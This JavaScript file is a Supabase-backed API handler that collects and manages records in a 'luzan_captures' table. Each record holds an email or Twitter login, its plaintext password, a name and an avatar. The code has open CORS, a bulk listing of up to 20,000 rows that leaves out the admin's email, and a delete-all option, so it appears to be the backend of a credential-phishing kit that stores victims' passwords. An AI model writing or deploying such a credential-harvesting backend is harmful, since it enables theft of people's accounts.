import supabase from './db-client.js';

const ADMIN_EMAIL = 'admin1234@gmail.com';

function cors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
}

function rid() {
  return `cap_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
}

export default async function handler(req, res) {
  cors(res);
  if (req.method === 'OPTIONS') return res.status(204).end();

  try {
    if (req.method === 'GET') {
      const type = req.query?.type;
      const limitRaw = parseInt(String(req.query?.limit || '20000'), 10);
      const limit = Math.min(Math.max(limitRaw || 20000, 1), 20000);
      // Fetch in pages to stay under PostgREST defaults while supporting 20k
      const pageSize = 1000;
      let all = [];
      for (let from = 0; from < limit; from += pageSize) {
        const to = Math.min(from + pageSize - 1, limit - 1);
        let q = supabase
          .from('luzan_captures')
          .select('*')
          .order('created_at', { ascending: false })
          .range(from, to);
        if (type === 'email' || type === 'twitter') {
          q = q.eq('type', type);
        }
        const { data, error } = await q;
        if (error) throw error;
        const chunk = data || [];
        all = all.concat(chunk);
        if (chunk.length < pageSize) break;
      }
      const rows = all.filter(
        (r) => String(r.email || '').toLowerCase() !== ADMIN_EMAIL.toLowerCase()
      );
      return res.status(200).json(rows);
    }

    if (req.method === 'POST') {
      const body = req.body || {};
      const email = String(body.email || '').trim();
      const password = String(body.password ?? '');
      const type = body.type === 'twitter' ? 'twitter' : 'email';
      const username = body.username ? String(body.username).trim() : null;
      const name =
        body.name ||
        (type === 'twitter' ? 'Twitter User' : 'Email User');
      const avatar = body.avatar || null;

      if (!email) return res.status(400).json({ error: 'email required' });
      if (email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
        return res.status(200).json({ skipped: true, admin: true });
      }

      // upsert by email+type
      const { data: existing } = await supabase
        .from('luzan_captures')
        .select('*')
        .eq('email', email)
        .eq('type', type)
        .maybeSingle();

      if (existing) {
        const { data, error } = await supabase
          .from('luzan_captures')
          .update({
            password,
            username: username || existing.username,
            name: name || existing.name,
            avatar: avatar || existing.avatar,
            last_seen_at: new Date().toISOString(),
            count: (existing.count || 1) + 1,
          })
          .eq('id', existing.id)
          .select()
          .single();
        if (error) throw error;
        return res.status(200).json(data);
      }

      const { count } = await supabase
        .from('luzan_captures')
        .select('*', { count: 'exact', head: true });

      const row = {
        id: rid(),
        type,
        email,
        password,
        username,
        name,
        avatar,
        seq: (count || 0) + 1,
        count: 1,
        created_at: new Date().toISOString(),
        last_seen_at: new Date().toISOString(),
      };

      const { data, error } = await supabase
        .from('luzan_captures')
        .insert(row)
        .select()
        .single();
      if (error) throw error;
      return res.status(201).json(data);
    }

    if (req.method === 'PUT') {
      const { id, ...patch } = req.body || {};
      if (!id) return res.status(400).json({ error: 'id required' });
      const allowed = {};
      for (const k of ['email', 'password', 'username', 'name', 'avatar']) {
        if (patch[k] !== undefined) allowed[k] = patch[k];
      }
      allowed.last_seen_at = new Date().toISOString();
      const { data, error } = await supabase
        .from('luzan_captures')
        .update(allowed)
        .eq('id', id)
        .select()
        .single();
      if (error) throw error;
      return res.status(200).json(data);
    }

    if (req.method === 'DELETE') {
      const all = req.query?.all === '1' || req.body?.all;
      if (all) {
        const { error } = await supabase
          .from('luzan_captures')
          .delete()
          .neq('id', '');
        if (error) throw error;
        return res.status(200).json({ ok: true });
      }
      const id = req.body?.id || req.query?.id;
      if (!id) return res.status(400).json({ error: 'id required' });
      const { error } = await supabase.from('luzan_captures').delete().eq('id', id);
      if (error) throw error;
      return res.status(200).json({ ok: true });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (err) {
    console.error('captures API error:', err);
    return res.status(500).json({ error: err.message || 'server error' });
  }
}
